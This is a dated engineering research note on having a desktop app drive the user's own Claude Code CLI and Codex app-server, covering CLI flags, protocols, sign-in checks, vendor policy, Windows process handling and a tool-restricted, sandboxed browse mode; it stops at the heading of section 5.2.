# Duet research: driving the user's own Claude Code and Codex

**Date:** 2026-10-22. **Scope:** research only, for Phase 2. It checks ARCHITECTURE.md §11 (and §4, §8) against current docs, source and local CLIs. ARCHITECTURE.md is not edited here; proposed edits are listed in [§9](#9-proposed-edits-to-architecturemd).

**Markers:** ✅ confirmed from a cited source or local `--help` · ✏️ changes §11 · ⚠ unverified or inferred.

**Local probes** (Windows 11; only `--version` and `--help` were run; no prompts were sent and no credential or config files were read):
- `claude` **2.1.308** (native `claude.exe` in `%USERPROFILE%\.local\bin`).
- `codex-cli` **0.160.1** (npm `codex.cmd` shim → `node bin/codex.js` → `@openai/codex-win32-x64/vendor/.../codex.exe`).

## Summary

1. ✅ **Anthropic's legal page still says what §11.1 quotes**, word for word. Newer and better: Anthropic's support article (update dated **2026-10-07**) says *"You can still use the Claude Agent SDK, `claude -p`, and third-party apps with your subscription limits."*
2. ✏️ **OpenAI now has a published position.** App-server docs: *"If you've built a local or open-source application using Codex app-server authentication, you can continue using it, though we recommend migrating to Sign in with ChatGPT … App-server authentication has never been permitted for commercial or hosted services."* Chord, being local and open source, fits that. OpenAI's preferred path for new apps has the app hold OAuth tokens, which conflicts with Duet's no-credentials rule.
3. ⚠ **The biggest technical-policy risk:** Claude Code's docs say `--bare` *"will become the default for `-p` in a future release"*. In bare mode, *"Claude Code never reads OAuth credentials"*. If that ships with no opt-out, every `-p` host on a subscription breaks.
4. ✅ **Every flag in the §11.2 Claude command exists in 2.1.308.** `--permission-prompt-tool` and `--append-system-prompt-file` are hidden from `--help` but documented. ✏️ Browse mode doesn't need a permission prompt tool: use `--permission-prompts none` (2.1.259+) and let Chord's tool server be the only gate.
5. ✏️ **`--restricted` only covers settings files.** ⚠ Nothing in its description covers the user's CLAUDE.md, auto memory or skills, so assume they still load. Add `CLAUDE_CODE_DISABLE_CLAUDE_MDS=1`, `CLAUDE_CODE_DISABLE_AUTO_MEMORY=1` and `--disable-slash-commands`, and use an empty Chord-owned working directory. `--bare` can't be used, because it ignores subscription sign-in.
6. ✏️ **Spike S5 is mostly answered from source.** `--disable shell_tool` (and `unified_exec`) removes Codex's shell tools.
   - `apply_patch` **cannot** be removed by config.
   - There is no tool allowlist, only a denylist that grows. For example, `browser_use` and `computer_use` are now on by default.
   - So browse threads need a read-only sandbox, Chord declining every file/command approval, and a runtime tripwire.
7. ✏️ **Drop the localhost HTTP MCP server for Duet.** Use the `chord-mcp` stdio helper already planned for *Connect an agent*, with a per-thread token passed in the environment. This avoids:
   - DNS-rebinding exposure;
   - the token sitting in argv;
   - Claude's 60 s per-request HTTP timeout, which would cut off approval waits;
   - the stateless HTTP changes in MCP 2026-07-28.
8. ✏️ **Tool names need underscores** (`read_tab`, not `tab.read`). The Claude API allows only `^[a-zA-Z0-9_-]{1,128}$`, Codex rewrites dots, and Codex dynamic tools reject them.
9. ✏️ **Page reads over 50,000 characters break in browse threads.** Claude Code saves the result to a file and hands the model a path, which a browse thread with no Read tool can't open. Cap ranged reads at about 40k characters.
10. ✏️ **Page text must arrive only as tool results**, JSON-encoded, never inlined into the user message (Anthropic's own guidance). The §11.2 diagram currently sends "resolved context" in the user turn.
11. ✅ **T3 Code confirms the model works:**
    - The user's own `claude` runs through the Agent SDK; `codex app-server` runs directly.
    - Sign-in status comes from each tool's protocol, never from credential files.
    - Windows needs real work for `.cmd` shims and PATH.
    - ⚠ Its optional "managed Codex" mode runs its own OpenAI OAuth. Chord should not copy that.
12. ✏️ **Ship no Anthropic code.** The Agent SDK is proprietary (*"© Anthropic PBC. All rights reserved"*), and the legal page says SDK-based products *"should use API key authentication"*. Spawning the unmodified `claude` binary sits squarely in the stated carve-out.

---

## 1. Claude Code CLI, headless

### 1.1 Version and cadence
- ✅ **Latest is 2.1.309** (npm, 2026-10-22 20:34 UTC); `stable` is 2.1.308. Releases land about **1–2 times a day** (2.1.305 → 2.1.309 over 2026-10-20 to 2026-10-22).
- ✅ **Native installs auto-update; package-manager installs don't.** `latest` is the default channel and `stable` runs about a week behind ([setup](https://code.claude.com/docs/en/setup)).
  - Homebrew, WinGet, apt, dnf and apk don't auto-update.
  - `claude update` defers to the package manager there (`claude --help`). The "please update" copy must therefore depend on how Claude was installed.
- ✅ **Install locations** ([setup](https://code.claude.com/docs/en/setup)):
  - Native: `~/.local/bin/claude` (a symlink into `~/.local/share/claude/versions/`) on macOS and Linux; `%USERPROFILE%\.local\bin\claude.exe` on Windows.
  - Homebrew cask, WinGet `Anthropic.ClaudeCode`, apt/dnf/apk.
  - npm, which installs the same native binary through a per-platform optional dependency. *"The installed `claude` binary does not itself invoke Node."*
- ✅ **Signed binaries:** "Anthropic PBC" on macOS (notarized) and "Anthropic, PBC" (Authenticode) on Windows. Linux has a signed `manifest.json`. Chord could check the signature before spawning, as an "unmodified binary" check (optional).
- ✅ **Windows:** Git for Windows is optional. Without it, Claude uses a PowerShell tool. That is irrelevant to browse mode, which has no built-in tools.

### 1.2 The long-lived session ✅
Source: [CLI reference](https://code.claude.com/docs/en/cli-reference), [headless](https://code.claude.com/docs/en/headless), [streaming input](https://code.claude.com/docs/en/agent-sdk/streaming-vs-single-mode).

- **Same flags as the SDK.** `-p --input-format stream-json --output-format stream-json --verbose` keeps one process alive for many turns while stdin stays open. This is the exact flag set the Agent SDK passes (seen in `@anthropic-ai/claude-agent-sdk@0.3.309` `sdk.mjs`: `"--output-format","stream-json","--verbose","--input-format","stream-json"`).
- **Token streaming:** `--include-partial-messages` adds `stream_event` lines carrying raw API stream events (`content_block_delta` / `text_delta`).
- **Input:** one JSON line per user message:
  `{"type":"user","message":{"role":"user","content":[…]},"parent_tool_use_id":null}`.
  - Images go in as base64 `image` blocks.
  - Optional fields: `priority` (`now`/`next`/`later`), `shouldQuery:false` (append without starting a turn), `client_composed:true` (no `@path` expansion, no slash commands).
- **Output types:**
  - `system` subtypes: `init`, `api_retry`, `permission_denied` and others.
  - `assistant`, `user` (tool results), `stream_event`.
  - `result`: subtype `success` or `error_max_turns | error_during_execution | error_max_budget_usd | error_max_structured_output_retries`, with `is_error`, `permission_denials`, `usage`, `total_cost_usd` and `terminal_reason` ([TS reference](https://code.claude.com/docs/en/agent-sdk/typescript)).
- **`system/init`** reports `tools`, `mcp_servers` (with status), `mcp_server_errors`, `model`, `permissionMode`, `apiKeySource` and `claude_code_version`. It also lists **`capabilities`** (2.1.205+, e.g. `interrupt_receipt_v1`). *"Check it to feature-detect instead of comparing version strings."*
- **`system/api_retry.error`** categories map directly to Duet's *Provider error* state: `authentication_failed`, `oauth_org_not_allowed`, `account_on_hold`, `billing_error`, `rate_limit`, `overloaded`, `model_not_found`, `server_error`, and others.

### 1.3 Resume, model, system prompt ✅
- **Sessions:**
  - `--session-id <uuid>` starts a session with Chord's own UUID; `--resume <id>` resumes it.
  - Since 2.1.223, resume searches every project on the machine, so the working directory doesn't have to match.
  - `--fork-session` branches a session; `--no-session-persistence` keeps nothing on disk (no resume).
- **Models:** `--model` accepts the aliases `sonnet`, `opus`, `haiku` and `fable`, or a full model name. `--fallback-model` takes a comma list.
- **System prompt flags:** `--append-system-prompt[-file]` and `--system-prompt[-file]`.
  - ✏️ **Snapshot behaviour:** by default the prompt is *recorded on a conversation's first request* and reused on every resume until compaction. A security fix to Duet's prompt would therefore not reach old threads. Pass `--system-prompt-snapshot off` (2.1.257+).
  - ⚠ Replacing the whole prompt (`--system-prompt`) on a subscription login is untested; keep the append form (T3 Code does the same, see §4).

### 1.4 Browse-mode tool restriction ✅ / ✏️
| Need | Flag / env | Verified |
|---|---|---|
| No built-in tools (Bash, file tools, WebFetch, WebSearch) | `--tools ""` | ✅ *"Use `""` to disable all"*. It **doesn't affect MCP tools**. |
| Ignore the user's and project's settings and hooks | `--restricted` (2.1.248+) | ✅ Loads only managed settings and `--settings`, refuses `bypassPermissions`. ⚠ Plugins, which are enabled in settings, are inferred to be skipped too. |
| Ignore every other MCP server | `--strict-mcp-config` | ✅ |
| No CLAUDE.md, no auto memory | `CLAUDE_CODE_DISABLE_CLAUDE_MDS=1`, `CLAUDE_CODE_DISABLE_AUTO_MEMORY=1` | ✅ ([env vars](https://code.claude.com/docs/en/env-vars)). ✏️ Missing from §11.2. |
| No skills or slash commands | `--disable-slash-commands` | ✅ ✏️ Missing from §11.2. |
| No repository content | Working directory = an empty Chord-owned folder | ✅ A `-p` run in an untrusted folder still runs that project's hooks and connects its `.mcp.json` servers ([permissions](https://code.claude.com/docs/en/permissions)). |
| Chord's tools run without a second prompt | `--allowedTools "mcp__chord__*"` | ✅ The glob is allowed after a literal `mcp__<server>__` prefix. |
| Anything else that would prompt is denied | `--permission-prompts none` (2.1.259+) | ✅ ✏️ Replaces `--permission-prompt-tool` in browse mode. |
| `--bare` | **Don't use** | ✅ Bare mode ignores OAuth, so subscription sign-in fails. |

- `EndConversation` survives `--tools ""` while MCP tools remain. That's harmless.
- `-p` runs default to Manual permission mode (2.1.302+). Chord should still set a permission mode explicitly.

### 1.5 Permission prompts routed to the host
- ✅ **Documented route:** `--permission-prompt-tool mcp__<server>__<tool>`. It can't approve tools marked `requiresUserInteraction` (2.1.199+). Not needed for browse mode; developer mode (Phase 4) does need it.
- ⚠ **Typed but not documented in prose:** the stream-json **control protocol**. The SDK uses it with `--permission-prompt-tool=stdio`.
  - The CLI sends `{"type":"control_request","request_id":…,"request":{"subtype":"can_use_tool","tool_name":…,"input":…}}`.
  - The host answers `{"type":"control_response","response":{"subtype":"success","request_id":…,"response":{"behavior":"allow"|"deny",…}}}`.
  - Source: `export declare type SDKControlRequest` in `sdk.d.ts` of `@anthropic-ai/claude-agent-sdk@0.3.309`. The same channel carries `interrupt`, `set_model`, `set_permission_mode`, `mcp_set_servers` and in-process MCP (`mcp_message`).

### 1.6 Cancellation and exit codes
- ✅ **Exit codes:** `0` on success, non-zero on failure. Failures inside a run (for example, missing auth) are printed as the `result` on stdout. Invalid flags go to stderr before the run, which is how to detect "CLI too old".
- ✅ **Signals:** SIGTERM exits with **143** and leaves the turn unfinished. *"To end the turn instead, send SIGINT, or call the Agent SDK's `interrupt()`"* ([headless](https://code.claude.com/docs/en/headless)).
- ⚠ **Windows has no SIGINT for a child process.** Node's `kill('SIGINT')` terminates the process outright. A clean **Stop** on Windows needs the control-protocol `interrupt` (gate it on `capabilities` containing `interrupt_receipt_v1`). The fallback is kill, then `--resume`; the interrupted turn stays as it was.
- ✅ **Closing stdin** ends the session once background work drains (capped at 10 min idle).

### 1.7 "Installed" and "signed in", without reading credential files ✅
- **Installed:** resolve the binary (§4.4), run `claude --version`, and parse `2.1.308 (Claude Code)`.
- **Signed in:** `claude auth status` prints JSON by default. *"Exits with code 0 if logged in, 1 if not."* Its `authMethod` is one of `none`, `claude.ai`, `oauth_token`, `api_key`, `api_key_helper` or `third_party` ([CLI reference](https://code.claude.com/docs/en/cli-reference)).
  - Read only the exit code and `authMethod`. The JSON can include account details, so never log it.
- ✏️ **Show which billing applies.** In `-p` mode, `ANTHROPIC_API_KEY` *"is always used when present"* ([authentication](https://code.claude.com/docs/en/authentication)). A user with that variable set would be billed to their Console account, not their subscription. Setup should say "Using your API key" when `authMethod` is `api_key`.
  - Chord must not strip the variable. Leave the user's environment alone.

## 2. Anthropic policy (fetched 2026-10-22)

[Legal and compliance](https://code.claude.com/docs/en/legal-and-compliance) (undated page). ✅ The text matches §11.1:

> Developers building products or services that interact with Claude's capabilities, including those using the Agent SDK, should use API key authentication … Anthropic does not permit third-party developers to offer Claude.ai login into their own applications, or to route requests through Free, Pro, or Max plan credentials on behalf of their users. Moreover, developers may not collect, store, or intermediate Claude.ai credentials or session tokens — sign-in to a Claude account must complete through Anthropic's own flow.

> … Nor does it prevent an end user from signing in to the unmodified Claude Code binary with their own Claude subscription …

> Anthropic reserves the right to take measures to enforce these restrictions and may do so without prior notice.

The same page also says:
- *"Unless we've mutually agreed otherwise, preinstalling or running Claude Code in your products or services (e.g. in hosted sandboxes or other agent infrastructure) requires agreeing to our Commercial Terms"*, with the binary unmodified and its authentication methods unrestricted.
  - ⚠ Whether "running" covers a local app spawning the user's own install is ambiguous. D2 chose not to seek an agreement.
- *"Advertised usage limits for Pro and Max plans assume ordinary, individual usage of Claude Code and the Agent SDK."* Duet is individual use.
- *"You can accurately say, in plain text, that your product … runs Claude Code. But you can't use the Claude Code or Anthropic names or logos as part of your own product, feature, or company name."* ✅ That matches the Duet naming rule.

✏️ **New since §11.1:** [Use the Claude Agent SDK with your Claude plan](https://support.claude.com/en/articles/15036540-use-the-claude-agent-sdk-with-your-claude-plan).
- **2026-06-15:** *"We've paused the previously-announced changes to Claude Agent SDK usage."* The paused plan would have moved SDK, `claude -p` and third-party app usage off subscription limits ([The New Stack](https://thenewstack.io/anthropic-pauses-claude-agent-sdk-subscription-change/)).
- **2026-10-07:** *"You can still use the Claude Agent SDK, `claude -p`, and third-party apps with your subscription limits."* Max and Team plans also gained monthly API credits.

**Reading (not legal advice):** the design is on the permitted side of every line, provided Chord:
- spawns the unmodified binary;
- leaves sign-in to `claude auth login`;
- never touches tokens;
- ships no Anthropic code.

The remaining exposure is policy change without notice (R8), plus the `--bare` default change (§1.4).

## 3. Codex CLI and `codex app-server`

Shorthand: **AS** = [learn.chatgpt.com/docs/app-server](https://learn.chatgpt.com/docs/app-server) (developers.openai.com/codex/app-server redirects there). **SRC** = `openai/codex` `codex-rs/`, read at commit `ca87ef8` (2026-10-22).

### 3.1 Version, license, stability
- ✅ **Versions:** latest is **0.163.0** (2026-10-15, [release](https://github.com/openai/codex/releases/tag/rust-v0.163.0)); 0.164.0-alpha.12 is in pre-release.
- ✅ **License:** Apache-2.0 (npm `@openai/codex`).
- ✅ **Stability:** *"The app-server command and WebSocket transport are experimental and aren't supported for production workloads"* (AS).
  - There is no protocol-version negotiation. Experimental fields need `capabilities.experimentalApi`, or the server rejects them.
  - Generate schemas that match the installed binary with `codex app-server generate-ts` / `generate-json-schema`.
- ✅ **Wire format:** JSON-RPC 2.0 messages **without the `"jsonrpc"` field**, newline-delimited over stdio (AS).
- ⚠ **The docs drift from the source.** The docs show `"sandbox":"workspaceWrite"`, but the source enum is kebab-case `workspace-write`. Build against generated types, not the doc examples.

### 3.2 Protocol (AS; SRC `app-server-protocol`) ✅
- **Handshake:** request `initialize {clientInfo:{name,title,version}, capabilities?}`, which returns `{userAgent, codexHome, platformFamily, platformOs}`. Then send the notification `initialized`.
  - *"Use `clientInfo.name` to identify your client for the OpenAI Compliance Logs Platform."*
- **Threads:**
  - `thread/start {cwd, model, sandbox, approvalPolicy, config, baseInstructions, developerInstructions, ephemeral, dynamicTools*}` (`*` = experimental)
  - `thread/resume {threadId, excludeTurns}`
  - `thread/fork`, `thread/list`, `thread/read`, `thread/archive`, `thread/delete`
- **Turns:**
  - `turn/start {threadId, input:[{type:"text",text}|{type:"image",url}|…], sandboxPolicy?, approvalPolicy?, model?, effort?}`
  - `turn/steer {threadId, input, expectedTurnId}`
  - `turn/interrupt {threadId, turnId}`
- **Other methods:** `model/list`; account methods (§3.5); `config/read`, `mcpServerStatus/list`.
- **Notifications:**
  - Turn lifecycle: `turn/started`, `turn/completed` with `turn.status` = `completed | interrupted | failed`.
  - Items: `item/started`, `item/completed` (the authoritative item state), `item/agentMessage/delta`, `item/reasoning/summaryTextDelta`.
  - `thread/tokenUsage/updated`, `error {error:{message, codexErrorInfo}, willRetry}`, `account/rateLimits/updated`.
- **Server → client requests (approvals and tools):**
  - `item/commandExecution/requestApproval`, `item/fileChange/requestApproval`. Decision is `accept | acceptForSession | decline | cancel` (commands also accept policy amendments).
  - `item/permissions/requestApproval`, `mcpServer/elicitation/request` (MCP tool approvals, when `tool_call_mcp_elicitation` is on, the default), `item/tool/requestUserInput`.
  - `item/tool/call` (dynamic tools).
- **Sandbox and approval values:**
  - Thread `sandbox`: `"read-only" | "workspace-write" | "danger-full-access"`.
  - Turn `sandboxPolicy`: `{type:"readOnly", networkAccess}` and similar.
  - `approvalPolicy`: `"on-request" | "never"` (`untrusted` is unsupported in config; `on-failure` is deprecated).

### 3.3 Spike S5: a tool-restricted browse thread ✏️
Verdict from source: **achievable, but only as a denylist, and `apply_patch` remains.**

- ✅ **Tool gates** in SRC `core/src/tools/spec_plan.rs`:
  - Shell tools are gated by `Feature::ShellTool`.
  - `apply_patch` is registered whenever `model_info.apply_patch_tool_type.is_some()`, with **no config switch**.
  - The others are gated by `ViewImage`, `ImageGeneration`, multi-agent, `update_plan`, and the web-search mode.
- ✅ **Default-on features that add model-callable tools** (SRC `features/src/lib.rs`): `shell_tool`, `unified_exec`, `view_image`, `image_generation`, `multi_agent`, `apps`, `plugins`, `tool_suggest`, `goals`, **`browser_use`**, **`computer_use`**, `skill_search` and `sleep_tool`.
- ✅ **No allowlist.** `ToolPolicy.allowed_tools` exists, but config and app-server can't reach it.
- ⚠ **The user's own `config.toml` MCP servers load into Duet threads.** Disable each one by name (from `mcpServerStatus/list`, *not* `config/read`, whose headers may hold secrets) with `mcp_servers.<name>.enabled=false`.

**Recipe to validate in S5 (one `codex app-server` dedicated to Duet browse threads):**

```
codex app-server --listen stdio://
  --disable shell_tool --disable unified_exec --disable view_image --disable image_generation
  --disable multi_agent --disable apps --disable plugins --disable tool_suggest --disable goals
  --disable browser_use --disable computer_use --disable skill_search --disable sleep_tool
  -c web_search="disabled"
```

- **Per thread:** repeat the same keys in `thread/start.config` (and resend them on `thread/resume`), use `sandbox:"read-only"` and `approvalPolicy:"on-request"`, and set `cwd` to an empty Chord-owned folder so no AGENTS.md loads.
- **Chord auto-declines** every `item/fileChange/requestApproval` and `item/commandExecution/requestApproval` in browse threads, and never shows them to the user.
- **Tripwire:** if a browse thread emits any item whose type isn't `agentMessage`, `reasoning`, `userMessage`, Chord's tool calls or a declined `fileChange`, Chord interrupts the turn, logs the item type, and marks that Codex version unsupported.
- **S5 pass criteria:**
  1. Prompts like "run `dir`", "edit a file" and "search the web" produce no `commandExecution`, `webSearch` or written file.
  2. Chord's tools work.
  3. The approval wait for a tier-1 tool survives 5 minutes.
  4. Resume restores the restrictions.
  5. Compare `approvalPolicy:"never"` (where failures return to the model) with `on-request` plus auto-decline.

**Tool delivery: an S5 decision.**
- (a) **`dynamicTools`** on `thread/start` (experimental): calls arrive as `item/tool/call {threadId, turnId, callId, namespace, tool, arguments}` and the reply is `{contentItems:[{type:"inputText",text}|{type:"inputImage",imageUrl}], success}`.
  - Scoped to the thread by construction; no Codex approval layer.
  - Names must match `^[a-zA-Z0-9_-]+$`. **Reserved namespaces include `browser`, `web`, `computer`, `terminal`, `functions`**, so use `chord`.
- (b) **The `chord-mcp` stdio helper**, the same one Claude uses. Set `mcp_servers.chord.default_tools_approval_mode="approve"` so Chord is the only gate, and raise `tool_timeout_sec` (default **60**) for approval waits ([Codex MCP](https://learn.chatgpt.com/docs/extend/mcp)).
  - ⚠ Whether a per-thread `config` can scope `mcp_servers.chord.env` (the token) is unverified.

**Default:** (a) if S5 shows it handles long waits and resume, because it is thread-scoped with no extra process; otherwise (b).

### 3.4 Sessions and the daemon
- ✅ **Persistence:**
  - Rollouts live in `$CODEX_HOME/sessions/YYYY/MM/DD/rollout-…-<threadId>.jsonl` and survive restarts.
  - Restart, then `initialize`, then `thread/resume`.
  - `ephemeral:true` threads stay in memory only.
- ✅ **Plain `codex app-server` runs its own in-process server.** It does *not* attach to the shared daemon (`codex agents`, `daemon_auto_start`); only `app-server proxy` does.
- ⚠ **Duet threads will probably show in the user's own Codex history.** Disclose this in settings, as §11.4 already does for transcripts.
- ⚠ **app-server starts a Code Mode host process** (`codex-code-mode-host.exe`). Kill the whole process tree.

### 3.5 Auth and signed-in detection ✅
- **`account/read {refreshToken:false}`** returns `{account: null | {type:"apiKey"} | {type:"chatgpt", email, planType} | …, requiresOpenaiAuth}`. `account/updated` reports changes.
  - This is what T3 Code uses. Read only `type` and `planType`.
- **`codex login status`** exits 0 when logged in and 1 when not, with its message on stderr. Use it before spawning app-server.
- **Never call the legacy `getAuthStatus`.** It takes `includeToken` and can return the token.
- **App-server can run the browser sign-in itself:** `account/login/start {type:"chatgpt"}` returns `{loginId, authUrl}` and hosts the localhost callback. The tokens stay inside Codex; Chord would only open a URL.
  - ✏️ That is smoother than opening a terminal for `codex login`, and Chord still never sees a token. Avoid `{type:"apiKey"}` and the experimental `chatgptAuthTokens`: both have the host handle secrets.

### 3.6 OpenAI terms for third-party hosts ✏️
- ✅ **AS, "Auth endpoints"** (undated):
  > If you've built a local or open-source application using Codex app-server authentication, you can continue using it, though we recommend migrating to Sign in with ChatGPT so users have greater control over and visibility into their usage. App-server authentication has never been permitted for commercial or hosted services.
- ✅ **Sign in with ChatGPT for open-source apps** ([docs](https://developers.openai.com/siwc/token-sharing-open-source.md)) is the path OpenAI now recommends. There the app runs the OAuth and stores the tokens, which **conflicts with Duet's no-credentials rule**.
- ✅ **OpenAI staff (Tibo), on X:**
  - 2026-01-09: *"You can already build on top of … codex-rs/app-server directly, which includes ChatGPT login and same usage as you get in codex"* ([post](https://x.com/thsottiaux/status/2009714843587342393)).
  - 2026-09-08: *"We support pure OSS clients and others we have partnerships with"* ([post](https://x.com/thsottiaux/status/2097131394199896166)).
- **Reading:** a free, local, open-source Chord using the user's own `codex login` is inside the stated allowance. Charging for it, or hosting it, would not be. "We recommend migrating" is a soft signal that this path could narrow later.

### 3.7 Windows ✅
- **Native Windows is supported**, with its own sandbox (`mxc` recommended); WSL2 is optional ([Windows sandbox](https://learn.chatgpt.com/docs/windows/windows-sandbox)).
- **Standalone installer:** `codex.exe` lands in `%LOCALAPPDATA%\Programs\OpenAI\Codex\bin`, which is added to the user PATH.
- **npm installs leave only a `codex.cmd` shim.** Spawning a `.cmd` without `shell` throws `EINVAL` since [CVE-2024-27980](https://nodejs.org/en/blog/vulnerability/april-2024-security-releases-2). Resolve the real `vendor/<triple>/bin/codex.exe` and spawn it with `shell:false`.

## 4. Prior art

### 4.1 T3 Code
[pingdotgg/t3code](https://github.com/pingdotgg/t3code): MIT, v0.1.2 (2026-10-22), Electron 44.9.3. All links below are at commit `2c8bdf6`.

- ✅ **Claude:**
  - Uses `@anthropic-ai/claude-agent-sdk` `query()` 0.3.276 with streaming input and `includePartialMessages`.
  - Always points it at the user's `claude` binary (`pathToClaudeCodeExecutable`). The SDK's bundled binaries are deleted at install ([pnpm-workspace.yaml](https://github.com/pingdotgg/t3code/blob/2c8bdf6177159d8fcd12a897d7c9311f6eb93237/pnpm-workspace.yaml#L261-L269)).
  - Approvals go through `canUseTool`; Stop uses `interrupt()`; threads use T3-allocated `sessionId` and `resume`.
  - Registers MCP servers over the control channel (`setMcpServers`) **so they aren't in argv**, which is *"readable by every local user"* ([ClaudeAdapterV2.ts](https://github.com/pingdotgg/t3code/blob/2c8bdf6177159d8fcd12a897d7c9311f6eb93237/apps/server/src/orchestration-v2/Adapters/ClaudeAdapterV2.ts#L917-L921)).
- ✅ **Codex:**
  - Spawns `codex app-server` with its own Effect JSON-RPC client, generated from the upstream schema at a pinned ref. Handshake: `initialize` with `experimentalApi:true`, then `initialized`.
  - Calls `thread/start`, `thread/resume {excludeTurns:true}`, `turn/start`, `turn/steer` and `turn/interrupt`.
  - Handles `item/commandExecution|fileChange|permissions/requestApproval` and `mcpServer/elicitation/request`.
- ✅ **Signed-in checks (no credential files):**
  - Claude: opens an SDK query whose prompt never yields, then reads `initializationResult().account`.
  - Codex: `account/read`.
  - Error copy: *"Run `claude auth login`"* and *"Run `codex login`"*.
  - ⚠ Its optional **managed Codex** mode downloads Codex and runs its own PKCE sign-in. That is a different policy posture; don't copy it.
- ✅ **Processes:**
  - Claude: one process per thread. Codex: one shared app-server.
  - Idle sessions are released after 30 min. After a crash nothing restarts in place; the next action starts a new process and resumes the thread.
- ✅ **Versions:** an advisory compatibility table, refreshed from GitHub at runtime ([model-manifest.json](https://github.com/pingdotgg/t3code/blob/2c8bdf6177159d8fcd12a897d7c9311f6eb93237/apps/server/src/provider/model-manifest.json#L4-L34)). Claude ≥2.1.280 counts as supported; Codex ≥0.156 supported and ≥0.159 recommended. It warns but never blocks.
- ✅ **Windows** (its hardest bugs, e.g. [#15011](https://github.com/pingdotgg/t3code/issues/15011)):
  - It resolves PATH and PATHEXT itself, follows npm shims to the real `.exe`, and runs `.cmd` targets only through an escaped `shell:true` line.
  - It repairs PATH by reading it from `$SHELL -ilc` on macOS and Linux, or from PowerShell plus known folders (`%APPDATA%\npm`, `~\.local\bin`, scoop, Volta, pnpm) on Windows.
  - WSL works by running its server inside the distro.
- ✅ **On policy:** Theo asked the Claude Code team publicly to bless the integration in [PR #179](https://github.com/pingdotgg/t3code/pull/179) (merged 2026-03-20); no Anthropic reply is recorded there.

**Conversation UI patterns Duet borrowed (Phase 2).** Read from a read-only snapshot at commit `51273020db3245f4ec29514a419d29b5dcb012dc`; every one was **reimplemented** in `apps/desktop/src/renderer/shell/Duet.tsx` with Chord's tokens. No code was copied, so no MIT notice is needed in Chord's files (the source comment credits the patterns). Chord's UI never names the project.

| Pattern | Where it is in T3 Code (`apps/web/src/…`) | In Duet |
|---|---|---|
| Follow new output, re-arm within 40 px of the bottom, a *Jump to latest* pill | `components/chat/MessagesTimeline.logic.ts` (`TIMELINE_FOLLOW_REARM_THRESHOLD_PX = 40`), `components/chat/useTimelineFollow.ts` | `FOLLOW_PX = 40` and the pill |
| Consecutive tool activity folds into one quiet row that expands | `components/chat/TimelineWorkGroupRows.tsx`, `components/chat/WorkLog.tsx` | `ToolRow` (*Read “Article”*, *Read 3 tabs · 1 more*) |
| Follow-ups sent while a reply streams are queued, shown as chips, removable | `components/chat/QueuedRunsControl.tsx`, `components/chat/queuedMessageEdit.ts` | the queue chips above the composer; main sends them in order |
| Enter sends, Shift+Enter is a new line, ↑ recalls what you sent | `components/chat/ChatComposer.tsx`, `components/chat/useComposerCommandKey.ts` | the composer (↑ in an empty composer) |
| Copy a message; edit the last one and send it again | `components/chat/MessageCopyButton.tsx`, `components/chat/TimelineUserMessageRow.tsx` | the user bubble's actions |
| Elapsed time while the agent works | `components/chat/AgentElapsed.tsx` | *Working… 12s* |
| A draft per thread, kept across switches | `composerDraftStore.ts` | drafts in `userData/duet/panel.json`, per chat |
| Model picker as a chip; rename and delete a thread | `components/chat/ComposerFooterControls.tsx`, `components/chat/ChatHeader.tsx`, `components/Sidebar.tsx` | the *provider · model* chip and the Chats menu |

Not adopted: the minimap, terminals, plans, subagents, worktrees, image attachments, and a context-usage meter (Duet would show one only if both CLIs reported usage).

### 4.2 Others (one line each)
- **[Agent Client Protocol](https://agentclientprotocol.com):**
  - [claude-agent-acp](https://github.com/agentclientprotocol/claude-agent-acp) is built on the SDK and defaults to the *bundled* binary; it checks `claude auth status --json`.
  - [codex-acp](https://github.com/agentclientprotocol/codex-acp) is built on app-server and bundles Codex unless `CODEX_PATH` is set.
  - ⚠ ACP would give one protocol, but adds two adapter packages that bundle their own CLIs by default and hide provider detail. Not recommended for Duet.
- **[Vibe Kanban](https://github.com/BloopAI/vibe-kanban):** raw `claude` with `stream-json` and `--permission-prompt-tool=stdio`, plus `codex app-server`. Both run from pinned `npx` copies, not the user's install.
- **[opcode](https://github.com/winfunc/opcode):** raw `claude -p --output-format stream-json --verbose`, with permissions bypassed.
- **[CodexMonitor](https://github.com/Dimillian/CodexMonitor):** app-server. **[Emdash](https://github.com/generalaction/emdash):** a PTY terminal plus ACP.

### 4.3 Lessons for Chord
1. **Spawn real executables with `shell:false`.**
   - Claude: `claude.exe` (native, WinGet) or the npm package's `bin/claude.exe`.
   - Codex: the standalone `codex.exe`, or the npm `vendor/.../codex.exe`.
   - Never spawn the `.cmd`.
2. **Repair PATH at startup.** GUI-launched apps don't inherit the login shell's PATH: probe `$SHELL -ilc` (5 s timeout) on macOS and Linux and PowerShell on Windows, then check known install folders. Show the resolved path in Settings and let the user override it.
3. **Warn on version, don't block.** Keep a minimum (§8) and a "tested up to" version; feature-detect through `system/init.capabilities` and app-server generated types.
4. **Kill the whole process tree.** On Windows, put children in a Job object or use `taskkill /T`.
5. **Recover from crashes by resuming, not restarting in place.**

### 4.4 Binary discovery table
| | Windows | macOS / Linux |
|---|---|---|
| Claude | `%USERPROFILE%\.local\bin\claude.exe`; WinGet ⚠ path; npm `…\node_modules\@anthropic-ai\claude-code\bin\claude.exe` (per T3) | `~/.local/bin/claude`; Homebrew `/opt/homebrew/bin`, `/usr/local/bin`; `/usr/bin` (apt/dnf); npm prefix |
| Codex | `%LOCALAPPDATA%\Programs\OpenAI\Codex\bin\codex.exe`; npm `…\@openai\codex-win32-x64\vendor\x86_64-pc-windows-msvc\bin\codex.exe` | Homebrew; npm vendor path; `~/.local/bin` ⚠ |

⚠ **WSL-only installs:** spawn `wsl.exe -d <distro> -- claude …`. That needs `cwd` path translation, so defer it past Phase 2. ⚠ A **Flatpak** Chord would need `flatpak-spawn --host`, a sandbox hole Flathub reviews case by case. This matters for Phase 3.

## 5. Giving the CLI browser context

### 5.1 Transports today
| | stdio | Streamable HTTP | Other |
|---|---|---|---|
| Claude Code | ✅ | ✅ (`http`, alias `streamable-http`; `sse` deprecated) | ✅ `ws`; ⚠ in-process `sdk` servers over the control channel (`mcp_message`), typed only |
| Codex | ✅ | ✅ (`--url`, `bearer_token_env_var`, `http_headers`) | ✅ `dynamicTools` (experimental) |

Sources: [Claude MCP](https://code.claude.com/docs/en/mcp), [Codex MCP](https://learn.chatgpt.com/docs/extend/mcp), `codex mcp add --help`.

### 5.2 Why not localhost HTTP for Duet ✏️
